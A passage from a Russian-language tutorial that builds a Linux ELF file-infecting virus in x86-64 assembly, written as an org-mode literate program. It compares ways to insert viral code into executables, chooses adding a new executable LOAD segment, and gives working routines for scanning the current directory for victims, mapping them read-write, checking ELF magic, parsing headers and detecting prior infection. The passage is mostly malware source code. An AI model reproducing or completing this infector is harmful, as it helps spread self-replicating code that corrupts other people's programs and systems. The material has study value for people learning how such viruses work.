  /// выход из инфектора
  _global_exit:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall

#+END_SRC


* Проблема инфицирования

Куда же в этой запутанной структуре мы можем вставить свой вирус?
Учитываем, что:
- Сегмент вируса должен загрузиться в память, следовательно, он должен
  быть частью какого-то LOAD-сегмента мишени или же иметь свой
  собственный LOAD-сегмент.
- Сегмент вируса должен иметь права на исполнение.
- Код в секциях обычно ссылается на данные, которые находятся в сегменте
  данных. Это значит, что если мы попытаемся вставить вирус между кодом и
  данными, то относительное расстояние между ними изменится и ссылки
  станут неверными. В результате мишень станет неработоспособной.

Есть три варианта, которые часто предлагаются в литературе, как наиболее простые:
- Вставить вирус в свободное пространство (заполненное нулями) между
  таблицей заголовков сегментов и кодом программы. Если вирус вмещается в
  padding, то нам вообще не придется редактировать какие-либо структуры
  ELF-a (кроме его заголовка, чтоб изменить адрес точки входа). Но это
  ненадежный способ - может не хватить места.
- Расширить LOAD-сегмент, доступный на исполнение и вписать вирус в его
  конец. Это может потребовать редактирования остальных заголовок
  сегментов, потому что все следующие сегменты сместятся. Этот способ
  довольно интересен, потому что не требует создания еще одного сегмента
  для вирусного кода. Но есть проблемы:
  - Как уже упоминалось выше, программы, слинкованные динамически, имеют
    секции PLT и GOT. PLT обычно располагается перед секцией .text в
    первом LOAD-сегменте, а вот GOT располагается уже во втором
    LOAD-сегменте. Если мы вставляем вирус в конец первого сегмента, то
    получается, что мы вставляем его между PLT и GOT. Из-за этого PLT
    больше не может обратиться к GOT, а обращается к адресу, где GOT была
    до заражения. Это можно было бы исправить, если отредактировать код
    PLT, найдя опкоды ~jmp~, ~call~, ~mov~, ~lea~ и отредактировав их. Но
    это требует написания ограниченного дизассемблера внутри вируса, так
    что пока откажемся от этого варианта.
- Вписать вирус перед таблицей заголовков секций мишени и оформить его в
  самостоятельный LOAD-сегмент. Этому сегменту понадобится свой
  собственный заголовок сегмента и заголовок секции. Вставка
  дополнительного заголовка сегмента приведет к тому, что весь код жертвы
  сместится равномерно и нам не придется редактировать код PLT. Это
  простой вариант, но два испольняемых сегмента в ELF-файле определенно
  насторожат антивирус, не говоря уже о исследователе-реверсере. Так как
  для нашей учебной задаче не требуется противодействовать антивирусам,
  то можно остановиться на этом способе.

* Инфицирование пошагово

Первая задача, которая перед нами стоит, заключается в том, чтобы вписать
код вируса в файл мишени, при этом ничего не сломав. Мы хотим пересобрать
файл таким образом, чтобы он содержал код вируса и оставался
работоспособным.

#+NAME: infected_elf
#+BEGIN_SRC ditaa :file ./img/infected_elf.png
  +----------------------------+  +----------------------------+
  | Заголовок ELF-файла        |  | Заголовок ELF-файла        |
  | (ELF-header)               |  |  (ELF-header)              |
  +----------------------------+  +----------------------------+

  +----------------------------+  +----------------------------+
  |Таблица заголовков сегментов|  |Таблица заголовков сегментов|
  | (Program Header Table)     |  | (Program Header Table)     |
  +----------------------------+  +----------------------------+
  | PHDR                       |  | PHDR                       |
  | INTERP                     |  | INTERP                     |
  | LOAD R                     |  | LOAD R                     |
  | LOAD RE                    |  | LOAD RE                    |
  | LOAD RW                    |  | LOAD RW                    |
  | ... (остальные заголовки)  |  | ... (остальные заголовки)  |
  +----------------------------+  | LOAD RE (заголовок вируса) |
                                  +----------------------------+
  +----------------------------+
  | Segment (PHDR)             |  +----------------------------+
  +----------------------------+  | Segment (PHDR)             |
  | Segment (INTERP)           |  +----------------------------+
  |    .interp                 |  | Segment (INTERP)           |
  +----------------------------+  |    .interp                 |
  | Segment (LOAD) R           |  +----------------------------+
  |    .interp                 |  | Segment (LOAD) R           |
  |      ...                   |  |    .interp                 |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) RE          |  +----------------------------+
  |    .text                   |  | Segment (LOAD) RE          |
  |      ...                   |  |    .text                   |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) R           |  +----------------------------+
  |      ...                   |  | Segment (LOAD) R           |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) RW          |  +----------------------------+
  |      ...                   |  | Segment (LOAD) RW          |
  +----------------------------+  |      ...                   |
  | Segment (DYNAMIC) RW       |  +----------------------------+
  |   .dynamic                 |  | Segment (DYNAMIC) RW       |
  +----------------------------+  |   .dynamic                 |
  | Segment (NOTE)             |  +----------------------------+
  |     ...                    |  | Segment (NOTE)             |
  +----------------------------+  |     ...                    |
  | Segment (GNU_...)          |  +----------------------------+
  |     ...                    |  | Segment (GNU_...)          |
  +----------------------------+  |     ...                    |
                                  +----------------------------+
  +----------------------------+  | Segment (LOAD) RE VIRUS    |
  | Таблица заголовков секций  |  |     ...                    |
  | (Section Header Table)     |  +----------------------------+
  +----------------------------+
  | .interp                    |  +----------------------------+
  | ... (иные екции мишени)    |  | Таблица заголовков секций  |
  +----------------------------+  | (Section Header Table)     |
                                  +----------------------------+
                                  | .interp                    |
                                  | ... (иные секции мишени)   |
                                  | .virus (секция вируса)     |
                                  +----------------------------+
#+END_SRC

Последовательность шагов для выполнения этой операции:
** Задать всем переменным значения по умолчанию

Для подавляющего большинства глобальных переменных, используемых в
вирусе, значение по умолчанию - это ноль, и в редких случаях -1.
И переменные проинициализированы этими значениями с самого начала.

Так зачем же делать это явно еще раз?

Представим себе ситуацию, что вирус уже заразил какую-то мишень и
исполняется из нее. Давайте подумаем, какие значения лежат в его
глобальных переменных, когда управление только перешло вирусу?

Очевидный ответ - значения по умолчанию - неверен.

В нашем случае переменные - это просто выделенная память, заполненная
нулями на этапе компиляции. Записывая вирус в какой-то файл, мы
записываем и его переменные, которые в этот момент могут содержать какие
угодно значения:уже пройдены этапы парсинга, пересчитывания всего и вся и
т.д. В результате когда вирус только начинает исполняться внутри
инфицированного файла, его переменные забиты чем угодно, но не нулями.

Наш вирус поделен на небольшие куски кода, каждый из которых проверяет
наличие критически важных данных конкретно для него: невозможно
пересчитать адреса или смещения в заголовках секций, если сами секции еще
не найдены, и т.д. Это страховка от ошибок. В большинстве случаев
проверка упирается в "не ноль ли в этой переменной". И пока вирус
исполняется из своего родного файла, эта проверка будет прекрасно
срабатывать. Но если вирус исполняется из инфицированного файла, то с
большой вероятностью, что значение переменной со старта уже не ноль -
вместо него там остались данные с прошлого заражения. В результате нас
ждут ошибки и сегфолты.

Поэтому перед каждым инфицированием нужно вернуть переменным "заводские"
значения, чтоб быть уверенным, что они отражают текущий процесс.

Сначала введем эти переменные, их будет очень много:

#+NAME: vars
#+BEGIN_SRC asm
  _msg_infection_success:
      .ascii " is successfully infected \n"

  _msg_cur_infection:
      .ascii " file: infection try \n"

  new_elf_file:
      .string "test_inf"

  dir_name:
      .string "./"

  mprotect_ok:
      .quad -1

  parse_success:
      .quad -1

  recount_success:
      .quad -1

  get_virus_success:
      .quad -1

  old_rsp:
      .quad 0     # вершина стека жертвы

  old_rbx:
      .quad 0

  old_rdx:
      .quad 0

  old_rcx:
      .quad 0

  old_rdi:
      .quad 0

  old_rsi:
      .quad 0

  old_r8:
      .quad 0

  old_r9:
      .quad 0

  old_r10:
      .quad 0

  old_r11:
      .quad 0

  old_r12:
      .quad 0

  old_r13:
      .quad 0

  old_r14:
      .quad 0

  old_r15:
      .quad 0

  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

  data_size:
      .quad 0x50

  constant_value:
      .quad 0x38

  clear_from:
      .quad 0

  fd:
      .quad 0

  interm_fd_file:
      .quad 0

  file_offset:
      .quad 0

  cur_filename:
      .quad 0

  dir_buf:
      .space 8000, 0

  dir_struct:
      .space 30, 0

  dir_buf_ptr:
      .quad 0

  file_name_ptr:
      .quad 0

  string_length:
      .quad 0

  victim_elf_addr:
      .quad 0

  victim_phdr_table_addr:
      .quad 0

  victim_phdr_table_size:
      .quad 0

  victim_phdr_amount:
      .quad 0

  victim_shdr_table_addr:
      .quad 0

  victim_shdr_table_size:
      .quad 0

  victim_shdr_amount:
      .quad 0

  virus_new_vaddr:
      .quad 0

  virus_new_phdr:
      .space 0x38, 0

  virus_new_shdr:
      .space 0x40, 0

  bind_now_flag_record:
      .space 0x10, 0

  last_seg_vaddr:
      .quad 0

  last_seg_allign:
      .quad 0

  victim_code_size:
      .quad 0

  victim_code_addr:
      .quad 0

  victim_code_frm_begin_vaddr:
      .quad 0

  victim_code_offset:
      .quad 0

  victim_code_before_bind_now_size:
      .quad 0

  victim_code_after_bind_now_size:
      .quad 0

  victim_code_before_bind_now_addr:
      .quad 0

  victim_code_after_bind_now_addr:
      .quad 0

  virus_code_addr:
      .quad 0

  virus_code_size:
      .quad 0

  symtab_shdr_addr:
      .quad 0

  symtab_records_amount:
      .quad 0

  dynamic_records_offset:
      .quad 0

  dynamic_records_size:
      .quad 0

  dynamic_records_vaddr:
      .quad 0

  dynamic_records_addr:
      .quad 0

  new_bind_now_flag_record_size:
      .quad 0

  new_bind_now_record_frm_dynamic_offset:
      .quad 0

  original_e_entry:
      .quad 0

  offset_to_e_entry:
      .quad 0

  move_victim_offset:
      .quad 0

  offset_to_e_entry_frm_file_begin:
      .quad 0

  frm_orig_e_entry_to_virus_e_entry_offset:
      .quad 0

  offset_to_vict_code_frm_file_begin:
      .quad 0

  sh_name_indx:
      .long 0

  first_seg_vaddr:
      .quad 0

  first_seg_addr:
      .quad 0

  GOT_vaddr:
      .quad 0

  GOT_size:
      .quad 0

  GOT_addr_in_memory:
      .quad 0

  rela_section_offset:
      .quad 0

  rela_section_size:
      .quad 0

  data_block:
      .space 0x50, 0

  cur_seg_addr:
      .quad 0

  cur_seg_end_addr:
      .quad 0

  cur_seg_hdr_ptr:
      .quad 0

  cur_seg_memsz:
      .quad 0

  file_sz:
      .quad 0

  clear_to:
      .quad 0

#+END_SRC

Объяснять каждую из них не имеет никакого смысла, вы познакомитесь с
каждой из них позже. Нужно обратить внимание только на две из них:
~clear_from~ и ~clear_to~. Поскольку все переменные (вообще вся
выделенная память) расположены друг за другом, то можно представить их
как единый массив, где ~clear_from~ и ~clear_to~ - это начало и конец
массива.

Дальше дело техники, нужно просто протись по массиву и заполнить его нулями:

#+NAME: _clear_array
#+BEGIN_SRC asm
  /// _CLEAR_ARRAY
  /// Заполняет все нулями
  /// с точки from до точки to
  _clear_array:
      push    %rcx

      mov     clear_from(%rip), %rax
      test    %rax, %rax
      je      _clear_array_fail

      mov     clear_to(%rip), %rcx
      test    %rcx, %rcx
      je      _clear_array_fail

      sub     %rax, %rcx
  _clear_array_cycle:
      movb    $0x0, (%rax)
      inc     %rax
      loop    _clear_array_cycle

  _clear_array_success:
      xor     %rax, %rax
      jmp     _clear_array_exit

  _clear_array_fail:
      mov     $-1, %rax

  _clear_array_exit:
      pop     %rcx
      ret
#+END_SRC


Но есть переменные, у которых значение "по умолчанию" - это -1. Их
придется заполнить вручную.

Создадим функцию ~_clear_old_data~, которая придаст всем переменным
значения по умолчанию:

#+NAME: _clear_old_data
#+BEGIN_SRC asm
  /// Очищает все переменные,
  /// занося в них значения "по умолчанию"
  _clear_old_data:
      push    %rbx
      leaq    clear_from(%rip), %rax
      leaq    clear_to(%rip), %rbx

      mov     %rbx, clear_to(%rip)
      mov     %rax, clear_from(%rip)

      call    _clear_array

      movq    $-1, parse_success(%rip)
      movq    $-1, get_virus_success(%rip)
      movq    $-1, recount_success(%rip)

      xor     %rax, %rax
      jmp     _clear_old_data_exit

  _clear_old_data_fail:
      mov     $-1, %rax

  _clear_old_data_exit:
      pop    %rbx
      ret

#+END_SRC

Вот теперь можно безбоязненно начинать процесс инфицирования.
** Сохранить все регистры
Для вируса, исполняющегося из своего родного файла,  сохранение
(и дальнейшее восстановление) регистров совершенно не нужно. Но зато это
критически важно для мишени.

Загружая инфицированную мишень, загрузчик оставляет в регистрах некоторых значения,
которые оказываются критично важны для корректного завершения
процесса. Но затем управление перехватывает вирус и затирает эти
значения, в результате чего мишень не может правильно завершиться.

Поэтому мы сначала сохраняем все регистры, а после того, как вирус
инфицирует какой-то новый файл и будет готов передать управление коду
мишени, мы эти регистры восстановим.

Сохранение регистров:

#+NAME: _save_registers
#+BEGIN_SRC asm :noweb yes
  /// Сохраняет все регистры кроме rax -
  /// он уже изменен - в переменные и
  /// настраивает стек
  /// Проверяет MPROTECT_OK
  _save_registers:
      mov     mprotect_ok(%rip), %rax
      test    %rax, %rax
      jne     _save_registers_fail

      <<_set_rsp>>
      mov     %rbx, old_rbx(%rip)
      mov     %rdx, old_rdx(%rip)
      mov     %rcx, old_rcx(%rip)
      mov     %rdi, old_rdi(%rip)
      mov     %r8, old_r8(%rip)
      mov     %r9, old_r9(%rip)
      mov     %r10, old_r10(%rip)
      mov     %r11, old_r11(%rip)
      mov     %r12, old_r12(%rip)
      mov     %r13, old_r13(%rip)
      mov     %r14, old_r14(%rip)
      mov     %r15, old_r15(%rip)

      xor     %rax, %rax
      jmp     _save_registers_exit

  _save_registers_fail:
      mov     $-1, %rax

  _save_registers_exit:
      jmp     _prepare_data

#+END_SRC

** Получить имя файла

Выше уже описывалась функция ~readdir~, которая считывает все записи
файлов (специальные структуры) из текущего каталога в буфер. Так же мы
договорились, что создадим указатель на первую структуру этого буфера и
сохраним его в переменной ~dir_buf_ptr~, чтоб можно было передвигаться со
структуры на структуру.

Теперь нужно создать функционал, который будет выполнять следующее:
- получит имя файла из структуры файла, на которую указывает
  ~dir_buf_ptr~
- проверит, не пустое ли оно - если да, то считаем, что структуры файлов
  кончились и возвращаем -1
- иначе сохраняет это имя в переменную ~file_name_ptr~ и сдвигает
  указатель ~dir_buf_ptr~ на следующую структуру

Структура файла содержит в себе не указатель на имя файла, а само имя,
т.е. массив символов. Из-за того, что имена могут быть разной длины,
труктуры файлов тоже получаются разного размера. Но к счастью, сама
структура имеет поле, в котором записано, какого она размера. Поэтому
когда мы двигаем ~dir_buf_ptr~ на следующую структуру, мы прибавляем к
нему не константное значение, а считываем размер текущей структуры и
сдвигаем указатель ровно на этот размер.

Вот так реализован весь алгорим:

#+NAME: _get_file_name
#+BEGIN_SRC asm
  /// Проверяет: указатель на текущую запись
  /// Успех: заполняет cur_filename указателем на
  /// имя и возвращает 0 в rax
  /// Фейл: заполняет cur_filename нулем и
  /// возвращает -1 в rax
  _get_file_name:
      push    %rbx
      push    %rcx

      // указатель не нулевой?
      mov     dir_buf_ptr(%rip), %rbx
      test    %rbx, %rbx
      je      _get_file_name_fail

      // получили имя
      lea     0x12(%rbx), %rax
      mov     (%rax), %rcx
      test    %rcx, %rcx
      je      _get_file_name_fail

      mov     %rax, file_name_ptr(%rip)

      xor     %rcx, %rcx
      // получили размер текущей структуры
      // (он меняется)
      movzwl  0x10(%rbx), %ecx
      // сдвинули указатель на
      // следующую структуру
      add     %rcx, %rbx

      mov     %rbx, dir_buf_ptr(%rip)
      xor     %rax, %rax
      jmp    _get_file_name_exit

  _get_file_name_fail:
      mov     $-1, %rax
      movq    $0x0, file_name_ptr(%rip)

  _get_file_name_exit:
      pop     %rcx
      pop     %rbx
      ret

      ERR_MSG _get_file_name "get_file_name: No files in directory any more"

#+END_SRC

** Смаппить файл в память

Самый простой способ, как открыть файл и иметь возможно редактировать его
прямо в памяти - это загрузить его образ в память и получить указатель на
эту память. Для этого понадобится системный вызов ~mmap~.

Он принимает 6 параметров: адрес для записи - по умолчанию выставляется
0, и тогда система сама назначает адрес, размер считываемого файла - его
мы получим в помощью ~stat~, которую реализовали в прошлом разделе, права
на доступ к памяти - чтение, запись и т.д., права на доступ к памяти для
процессов, файловый дескриптор считываемого файла - его мы получим с
помощью ~open~, и смещение от начала считываемого файла - у нас это будет
0, поскольку считывается весь файл.

#+NAME: _my_mmap
#+BEGIN_SRC asm

  /// MY_MMAP file into memory
  /// Считывает файл в память по заданному адресу.
  /// Флаги должны быть такими же, какие передавали
  /// open для открытия файла.
  /// @PARAMS
  ///  - %RDI - адрес для записи (по умолчанию NULL,
  ///           в этом случае назначается OS)
  ///  - %RSI - длина считываемого файла
  ///  - %RDX - права доступа к памяти
  ///           (RDONLY, RDWR и т.д.)
  ///  - %RCX -  права для доступа к памяти для
  ///            процессов (MMAP_SHARED, MMAP_PRIVATE)
  ///  * %R8 -   fd считываемого файла
  ///  * %R9 -   offset от начала считываемого файла
  /// @ RETURN VALUE
  /// * RAX - указатель на файл в памяти или отриц. заначени
  _my_mmap:
      push %rbx
      push %rcx
      push %rdx
      push %rbp
      push %r10

      mov %r9, %r15
      mov %rsi, %r13
      mov %rdi, %r12
      mov %ecx, %r14d

      movslq %r8d, %rbp
      movslq %edx, %rbx
      movslq %r14d, %r10
      mov $0x9, %eax

      syscall

      pop %r10
      pop %rbp
      pop %rdx
      pop %rcx
      pop %rbx
      ret

#+END_SRC

А теперь реализуем функцию ~openfile~, которая объединит в себе вызовы
~open~, ~stat~ и ~mmap~. Она будет принимать имя файла и права, открывать
файл, узнавать его размер и мапить его в память.

В случае успеха вернет в ~rax~ указатель на начало файла в памяти,
иначе - минусовое значение.

Чтоб было проще указывать разнообразные права, создадим константы.

#+NAME: _openfile_consts
#+BEGIN_SRC asm :noweb yes
      .set O_RDONLY, 0x0
      .set O_RDWR, 0x2
      .set MAP_PRIVATE, 0x2
      .set PROT_NONE, 0x0
      .set PROT_READ, 0x1
      .set PROT_WRITE, 0x2
      .set PROT_EXEC, 0x4
      .set PROT_READ_OR_PROT_WRITE, 0x3
      .set O_RDWR_AND_O_APPEND, 0x402

  <<_phdrs_consts>>
#+END_SRC

#+NAME: _openfile
#+BEGIN_SRC asm

  /// OPENFILE
  /// Открывает файл с указанными флагами,
  /// маппит его в память
  ///
  /// @PARAMS:
  /// - %RDI - file name
  /// - %RSI - flags
  ///
  /// @RET:
  /// - %RAX - указатель на файл в памяти
  /// или отричательное значение
  _openfile:
      push    %rbp
      mov     %rsp, %rbp

      mov     $0x2, %rax  # fopen syscall
      syscall
      test    %rax, %rax

      jl      _openfile_exit

      // save all regs
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %r9
      push    %r10

      # сохранить дескриптор жертвы
      mov     %rax, fd(%rip)

      // space for local vars
      sub     $0xA0, %rsp

      mov     %rax, %rcx          # fd
      mov     %rsi, %rdx          # openfile flags

      // call stat
      // (need no less 0xA0 for struct stat)
      // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
      leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
      call    _my_stat

      // prepare params for mmap
      mov     %rcx, %r8           # fd
      mov     %rdx, %rax          # flags
      xor     %rdi, %rdi          # addr

      // 0x70 - offset to filesz field in stat struct
      // mov     -0x70(%rbp), %rsi   # filesz
      mov     -0xA0(%rbp), %rsi   # filesz
      mov     %rsi, file_sz(%rip)
      xor     %r9, %r9            # offset

      // doesn't need shared mmap
      mov     $MAP_PRIVATE, %rcx

      mov     $O_RDONLY, %rbx
      cmp     %rbx, %rax
      je      mmap_rdonly

      // define mmap flags
      mov     $O_RDWR, %rbx
      cmp     %rbx, %rax
      jne     _openfile_flags_error

  mmap_rdwr:
      mov     $(PROT_READ | PROT_WRITE), %rdx # prot
      jmp     call_my_mmap

  mmap_rdonly:
      mov     $PROT_READ, %rdx            # prot
      // call mmap
  call_my_mmap:
      call    _my_mmap

      // recover stack
      add     $0xA0, %rsp
      pop     %r10
      pop     %r9
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx

  _openfile_exit:
      pop     %rbp
      ret

      ERR_MSG _openfile_neg_fd "openfile neg fd"
      ERR_MSG _openfile_flags "openfile undefined flags"
      ERR_MSG _openfile_ptr "openfile returned zero ptr"

#+END_SRC

Теперь сделаем обертку вокруг этого функционала, чтоб не думать об
параметрах ~openfile~ и прочем. Функция ~_get_victim_addr~
будет брать имя из указателя ~filename~ и маппить файл в память.
В случае успеха адрес этого файла в памяти будет положен в переменную
~victimv_elf_addr~, а иначе функция вернет -1.

#+NAME: _get_victim_addr
#+BEGIN_SRC asm
  /// Открывает файл и сохраняет его
  /// адрес
  _get_victim_addr:
      push    %rdi
      push    %rsi

      mov     file_name_ptr(%rip), %rdi
      mov     $O_RDWR, %rsi
      call    _openfile

      cmp     $0x0,  %rax
      jl      _get_victim_addr_fail

      mov     %rax, victim_elf_addr(%rip)
      xor     %rax, %rax
      jmp     _get_victim_addr_exit

  _get_victim_addr_fail:
      mov     $-1, %rax

  _get_victim_addr_exit:
      pop    %rsi
      pop    %rdi
      ret

#+END_SRC

** Убедиться, что это ELF-файл

У каждого ELF-файла в самом его начале есть так называемые "магические
байты". Они представляют собой последовательность чисел, по которым
определяется, что это именно ELF-файл, а не какой-то еще.

#+NAME: magic_bytes_example
#+BEGIN_SRC asm :noweb yes
  magic_bytes_example:
      .quad 0x10102464c457f

#+END_SRC

Поэтому нужно просто считать первый 8 байт смапенного файла. И если они
совпадают с магическими байтами, то мы считаем, что это ELF-файл.

#+NAME: _is_it_elf
#+BEGIN_SRC asm :noweb yes
  /// IS_IT_ELF
  /// PARAMS
  /// Проверяет наличие магических байт в
  /// загруженном эльфе
  /// Если магические байты есть, то
  /// возвращает 1 в RAX
  /// В противном случае - 0
      <<magic_bytes_example>>

  _is_it_elf:
      push    %rdx
      push    %rbx
      push    %rsi
      push    %rcx

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _is_it_elf_fail

      movq    (%rbx), %rdx
      mov     magic_bytes_example(%rip), %rsi

      cmp     %rsi, %rdx
      jne     _is_it_elf_fail

      xor     %rax, %rax
      jmp     _is_it_elf_exit

  _is_it_elf_fail:
      mov     $-1, %rax

  _is_it_elf_exit:
      pop     %rcx
      pop     %rsi
      pop     %rbx
      pop     %rdx
      ret

#+END_SRC

** Найти Section Header Table и сохранить информацию о ней.

Как мы уже выяснили, сегменты поделены на секции. Нам часто придется к
ним обращаться, а лучший способ получить информацию о них - это прочитать
ее из их заговков. Для этого найдем таблицу заголовков секций в памяти,
сохраним ее адрес, узнаем и сохраним количество заголовков в ней и
сколько байт они занимают все вместе.

В заголовке ELF-файла есть два поля, отвечающих за таблицу секций:
~e_shoff~ и ~e_shnum~. Первое хранит в себе смещение от начала файла до
таблице секций, а второе - количество заголовков в таблице. А из
документации известно, что на 64-разрядной архитектруе один заголовок
занимает 60 байт. Имея эти значения и базовый адрес смаппенного файла, мы
легко получим все, что нам нужно.

Чтоб можно было добраться до разнообразных полей заголовка ELF-a,
создадим константы, которые будем использовать как смещения от базового
адреса заголовка до нужного поля.

#+NAME: _elf_hdr_consts
#+BEGIN_SRC asm :noweb yes
  .set ELF_E_ENTRY, 0x18
  .set ELF_E_PHOFF, 0x20
  .set ELF_E_SHOFF, 0x28
  .set ELF_E_PHNUM, 0x38
  .set ELF_E_SHNUM, 0x3c

#+END_SRC

Так же, как о таблице заголовков сегментов, получим информацию о таблице
заголовков секций.

Вот реализация этого механизма:

#+NAME: _get_shdrs_info
#+BEGIN_SRC asm

  /// получает данные о заголовках секций
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_shdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_shdrs_info_fail
      mov     %rdi, %rsi

      mov     ELF_E_SHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_shdr_table_addr(%rip)

      mov     ELF_E_SHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_shdr_amount(%rip)

      mov     $0x40, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_shdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_shdrs_info_exit

  _get_shdrs_info_fail:
      mov     $-1, %rax

  _get_shdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Мы планируем взаимодействовать с полями заголовокв секций. Так что
создадим константы и на этот случай.

#+NAME: _shdrs_consts
#+BEGIN_SRC asm :noweb yes
  <<_elf_hdr_consts>>

      .set SHDR_SH_ADDR, 0x10
      .set SHDR_SH_TYPE, 0x4
      .set SHDR_SH_OFFSET, 0x18
      .set SHDR_SH_SIZE, 0x20

  <<_data_block_consts>>
#+END_SRC

** Убедиться, что файл не заражен

Бессмысленно заражать файл повторно, поэтому прежде чем заражать файл,
надо убедиться, что он чист. Самый верный вариант - это поискать код
вируса в файле.

Очевидная идея: поскольку вирус будет исполняться первым в инцированном
файле, т.е. входная точка файла будет фактически входной точкой вируса,
то можно взять точку входа вируса, точку входа жертвы и сравнивнить их n байт.

Но это не сработает по нескольким причинам.

Во-первых, виртуальные адреса совершенно не совпадают с теми, по которым
лежит смапенный файл в память. И в принципе, можно найти точку входа
мишени в памяти: для этого нужен базовый виртуальный адрес ELF-a -
виртуальный адрес первого LOAD-сегмента и базовый адрес ELF-а в
памяти. Вычитаем базовый виртуальный адрес из виртуального адреса точки
входа - получаем таким образом смещение от начала файла до точки входа -
и складываем его с базовым адресом ELF-a в памяти. Так мы получаем точку
входа в смапенном файле.

Но тут есть проблема "во-вторых". Дело в том, что ~mmap~ не учитывает
смещения сегментов, он просто загружает образ файла в память. А вот
виртуальные адреса посчитаны таким образом, чтоб учитывать эти
смещения. В результате описанного выше метода подсчета, смещение до точки
входа может получиться совершенно гигантским - несколько десятков или
сотен тысяч байт - когда на самом деле точка входа расположена от начала
файла в 100 байтах и именно по этому смещению она лежит в смапенном файле
в памяти.

Но прочесывать все загружаемые сегменты или вообще весь файл тоже как-то
не хочется, поэтому мы будем прочесывать секции. Секции, в отличие от
сегментов, маленькие. Более того, известно, что секция .text, которая как
раз начинается с точки входа, имеет тип PROBITS - т.е. программа
распоряжается ею единолично. Следовательно, можно просматривать секции
только этого типа и только сначала, что уменьшеает количество работы.

Байты вируса, с которыми идет сравнение, получить просто: раз исполнение
идет, то вирус уже загружен в память. Следовательно, можно взять адрес
его метки ~_start~ и сравнивать с ее первыми 32 байтами  начало каждой
секции мишени. Если ни в одной секции совпадниея не было, файл
чист. Иначе считаем его зараженным.

Для этого реализуем цикл в цикле:
- внутренний цикл будет сверять наало текущей секции с кодом вируса:

#+NAME: _inside_cycle
#+BEGIN_SRC asm :noweb yes
_check_segm_infection_cycle:
      movq    (%rdi), %rax
      movq    (%rbx), %r8

      cmp     %rax,  %r8
      jne     _next_segm

      add     $0x8, %rdi
      add     $0x8, %rbx

      loop    _check_segm_infection_cycle
      jmp     _check_file_infection_fail
#+END_SRC

- а внешний цикл проходится по заголовкам секций и ищет секции типа
  PROGBITS и если находит такую, то передает управление внутреннему
  циклу:

#+NAME: _outside_cycle
#+BEGIN_SRC asm :noweb yes
  _check_file_infection_cycle:
      push    %rcx
      mov     SHDR_SH_TYPE(%rsi), %rbx

      // секция SHT_PROGBITS?
      cmp     $0x1, %bl
      jne     _next_segm


      mov     SHDR_SH_OFFSET(%rsi), %rbx
      mov     $0x4, %rcx

      // адрес сегмента в памяти
      add     %rdx, %rbx

      // проверяем конкретную
      // секцию кода
      <<_inside_cycle>>

  _next_segm:
      pop     %rcx
      add     $0x40, %rsi
      loop    _check_file_infection_cycle
#+END_SRC

Теперь соединим это в одну функцию:

#+NAME: _check_file_infection
#+BEGIN_SRC asm :noweb yes
  /// _CHECK_FILE_INFECTION
  /// Проверяет, является ли открытый файл зараженным
  /// - проверяем каждую загружаемую секцию
  /// - берем ее смещение, считаем адрес его кода
  ///   в памяти
  /// - сравнивам первый 32 байта по этому адресу со
  ///   start вируса
  /// - если совпали - файл заражен, вернуть -1
  /// - иначе проверить все сегменты, если нигде не совпало,
  /// вернуть 0
  _check_file_infection:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rbx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_elf_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _check_file_infection_fail

      mov     victim_shdr_table_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _check_file_infection_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _check_file_infection_fail

      leaq    _start(%rip), %rdi

      <<_outside_cycle>>

  _check_file_infection_success:
      xor     %rax, %rax
      jmp     _check_file_infection_exit

  _check_file_infection_fail:
      pop     %rcx
      mov     $-1, %rax

  _check_file_infection_exit:
      pop    %rsi
      pop    %rdi
      pop    %r8
      pop    %rbx
      pop    %rdx
      pop    %rcx
      pop    %rbx
      ret
#+END_SRC

** Найти Program Header Table и сохранить информацию о ней

Чтоб понимать, где какие сегменты кода находятся в файле, нам нужна
информация о таблице сегментов: где она находится в смапенной памяти,
сколько в ней заголовков и сколько места занимают все заголовки вместе.

Аналогично с полями ~e_shoff~ и ~e_shnum~, которые описывают таблицу
заголовков секций, в заголовке эльфа есть поля ~e_phoff~ и ~e_phnum~.
~e_phoff~ содержит смещение от начала файла до таблицы заголовков сегментов,
а ~e_phnum~ - количество этих заголовков.Из документации известно, что 1
заголовок сегмента занимает 56 байт.

Выудим нужную информацию по аналогии с заголовками сегментов:

#+NAME: _get_phdrs_info
#+BEGIN_SRC asm

  /// получает данные о заголовках сегментов
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_phdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_phdrs_info_fail

      mov     %rdi, %rsi
      mov     ELF_E_PHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_phdr_table_addr(%rip)

      mov     ELF_E_PHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_phdr_amount(%rip)

      mov     $0x38, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_phdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_phdrs_info_exit

  _get_phdrs_info_fail:
